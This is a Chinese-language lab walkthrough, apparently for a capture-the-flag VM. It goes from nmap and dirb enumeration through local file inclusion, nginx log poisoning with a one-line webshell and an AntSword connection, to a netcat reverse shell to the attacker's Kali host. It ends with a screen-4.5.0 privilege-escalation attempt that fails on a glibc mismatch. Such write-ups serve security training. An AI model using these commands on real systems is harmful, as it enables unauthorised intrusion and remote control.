# 端口发现
nmap -sP 192.168.31.0/24
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668304994439-0dc8624c-4b12-4c5d-b211-1e866bd0a8e6.png#averageHue=%23262c38&clientId=ube987d4c-00cb-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=332&id=u60f67070&margin=%5Bobject%20Object%5D&name=image.png&originHeight=332&originWidth=1271&originalType=binary&ratio=1&rotation=0&showTitle=false&size=107775&status=done&style=none&taskId=ub7be88dc-2cd4-450c-bdde-6449ffab889&title=&width=1271)
nmap -p- -A 192.168.31.146
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668305045814-d2cfac2a-80a6-41b8-a483-e3ba150b8e6a.png#averageHue=%23262c38&clientId=ube987d4c-00cb-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=451&id=ue797f7fe&margin=%5Bobject%20Object%5D&name=image.png&originHeight=451&originWidth=1235&originalType=binary&ratio=1&rotation=0&showTitle=false&size=128026&status=done&style=none&taskId=ud8aa61f9-7073-4bec-947f-40f39957b5a&title=&width=1235)
# web 突破
访问 80 端口
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668305111981-33896b12-9c00-4e00-9de6-8c1b811b2e47.png#averageHue=%23cac8c5&clientId=ube987d4c-00cb-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=983&id=u2c3e78b8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=983&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=202151&status=done&style=none&taskId=uecdd2029-75fc-4a8b-8044-129f391d61b&title=&width=1920)
dirb 扫目录
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668305172201-e0da86c5-fe16-41c2-aecb-2270679ada87.png#averageHue=%23262b37&clientId=ube987d4c-00cb-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=381&id=ue32e88bc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=381&originWidth=1274&originalType=binary&ratio=1&rotation=0&showTitle=false&size=95304&status=done&style=none&taskId=u7be68a65-9609-4d5a-9be1-b4d1cde6b75&title=&width=1274)
dirb 扫 .html .txt .php
dirb http://192.168.31.146 -X .html .php .txt
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668305496110-1322596e-ced0-491f-9d9c-64ce1ed4a672.png#averageHue=%23282d3a&clientId=ube987d4c-00cb-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=215&id=u2cbee6d3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=215&originWidth=978&originalType=binary&ratio=1&rotation=0&showTitle=false&size=73275&status=done&style=none&taskId=u6ef6a474-0131-4f3c-86dc-b03d36782e2&title=&width=978)
访问主页的时候，发现 contact 页面提交后的 thankyou.php 页面会根据 contact 页面提交内容不同页脚年份会发生变化，但是 footer.php 是 2017 年，所以可能有文件包含
尝试发现确实有文件包含
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668306174896-596bca91-183b-45af-bb15-1547ea7a8414.png#averageHue=%2381807d&clientId=ube987d4c-00cb-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=539&id=uedf54ca1&margin=%5Bobject%20Object%5D&name=image.png&originHeight=539&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=105755&status=done&style=none&taskId=u268a786a-1109-48b0-9067-3a31552edae&title=&width=1920)
访问 nginx 的配置文件  /etc/nginx/nginx.conf
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668306293142-cd22df9b-8d81-44a5-88b9-e920e7b5af41.png#averageHue=%23807e7b&clientId=ube987d4c-00cb-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=509&id=u2a7dda4b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=509&originWidth=1919&originalType=binary&ratio=1&rotation=0&showTitle=false&size=107152&status=done&style=none&taskId=u458fb5e3-9fb1-4b18-8b47-e99547ee1dd&title=&width=1919)
发现 nginx 的日志文件  /var/log/nginx/access.log  
访问一句话木马，使之写入 nginx 的日志文件里
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668307854434-c9d474b0-bdfa-4a26-b203-ef542fb85cee.png#averageHue=%23f2f2f1&clientId=ube987d4c-00cb-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=106&id=ue76bb29a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=106&originWidth=488&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11524&status=done&style=none&taskId=ufc9797a4-6b53-40ca-ad75-f7c00657557&title=&width=488)
访问日志文件
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668307871377-f7685fa9-d9e2-4583-93d7-f15a8f650484.png#averageHue=%23f5f4f4&clientId=ube987d4c-00cb-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=621&id=uf7bfe4f0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=621&originWidth=1169&originalType=binary&ratio=1&rotation=0&showTitle=false&size=104940&status=done&style=none&taskId=u6f42096b-1d1d-4413-bb5a-9a8da2f479b&title=&width=1169)
蚁剑连接
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668307800805-0446850e-2ea5-4ad8-b753-8f2e29de0402.png#averageHue=%23ececec&clientId=ube987d4c-00cb-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=349&id=u92509e8b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=349&originWidth=1020&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43672&status=done&style=none&taskId=u5062c510-bae8-4a4e-9a69-ffe5bc4e941&title=&width=1020)
成功，在蚁剑打开终端，将 shell 反弹到 kali 上，kali 监听 端口
kali：nc -lvvp 4444
蚁剑（靶机）：nc 192.168.31.128 4444 -e /bin/bash
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668308000919-603c5b6a-87d4-41af-a96f-58c19510d3b9.png#averageHue=%23535352&clientId=ueb18e7a3-7355-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=221&id=u17160b19&margin=%5Bobject%20Object%5D&name=image.png&originHeight=221&originWidth=1013&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25567&status=done&style=none&taskId=u05b5a1db-2ccf-4383-a720-cdefa36194f&title=&width=1013)
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668308043458-c70ec31d-9880-4dc2-9e91-63e07dd193ca.png#averageHue=%23262d38&clientId=ueb18e7a3-7355-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=162&id=u9152db1f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=162&originWidth=879&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33765&status=done&style=none&taskId=u63130dbe-1a79-41b5-88b3-b3e2082ad11&title=&width=879)
kali 拿到 shell
python 优化 shell
python -c 'import pty;pty.spawn("/bin/bash")'
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668308119221-8896d4c4-8ff4-435d-bdee-bf1c5260d10b.png#averageHue=%232a3948&clientId=ueb18e7a3-7355-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=72&id=uac653b44&margin=%5Bobject%20Object%5D&name=image.png&originHeight=72&originWidth=428&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8698&status=done&style=none&taskId=udfc74166-5dbb-4982-ad8e-7637e5c2c34&title=&width=428)
查看哪些命令有 suid 权限
find / -perm -u=s -type f 2>/dev/null  或  find / -user root -perm -4000 -print 2>/dev/null 
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668308195910-7fb65817-882f-4e53-8cf6-4791a48ae9ac.png#averageHue=%23252a36&clientId=ueb18e7a3-7355-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=357&id=u8921d1ee&margin=%5Bobject%20Object%5D&name=image.png&originHeight=357&originWidth=1164&originalType=binary&ratio=1&rotation=0&showTitle=false&size=74716&status=done&style=none&taskId=ub7a640f2-43af-4cf0-8603-d8ce272d6df&title=&width=1164)
有 screen-4.5.0 
_GNU Screen是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。_
_GNU Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。_
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668308401584-13bcc7de-3422-4b45-a52d-03360179f3c6.png#averageHue=%23272c37&clientId=u2af935fa-e323-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=243&id=u6baef5f2&margin=%5Bobject%20Object%5D&name=image.png&originHeight=243&originWidth=1249&originalType=binary&ratio=1&rotation=0&showTitle=false&size=65682&status=done&style=none&taskId=uf0292534-0c9d-4618-88b0-84274a65b04&title=&width=1249)


# 提权
将 41154.sh 通过 nc 传到靶机中，赋予权限后运行
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668310163185-875f8cb8-004c-476b-a41e-2e375567674e.png#averageHue=%232b323e&clientId=uc05aa535-184d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=60&id=u0f75bc54&margin=%5Bobject%20Object%5D&name=image.png&originHeight=60&originWidth=465&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10543&status=done&style=none&taskId=ubc929558-8c52-4154-b422-a9d7a3043dc&title=&width=465)
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668310153581-3d876f9e-f5cf-4cb0-9187-8f647c1bf532.png#averageHue=%232a323e&clientId=uc05aa535-184d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=169&id=ud4a6d8e1&margin=%5Bobject%20Object%5D&name=image.png&originHeight=169&originWidth=741&originalType=binary&ratio=1&rotation=0&showTitle=false&size=39871&status=done&style=none&taskId=u2de8b134-c4fe-4068-8287-45368ea9c2a&title=&width=741)
提示说版本不对，找不到 GLIBC_2.34
正常的话，运行了 41154.sh 就提权成功，靶机版本不对没有 root 也不能安装所需版本
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668310193264-65c6b0a9-2922-4648-bc58-bfc49f1fd760.png#averageHue=%23272f3b&clientId=uc05aa535-184d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=292&id=ud47b5f9a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=292&originWidth=1008&originalType=binary&ratio=1&rotation=0&showTitle=false&size=68096&status=done&style=none&taskId=u003d0669-bc18-4d06-a24f-83965c4bae0&title=&width=1008)


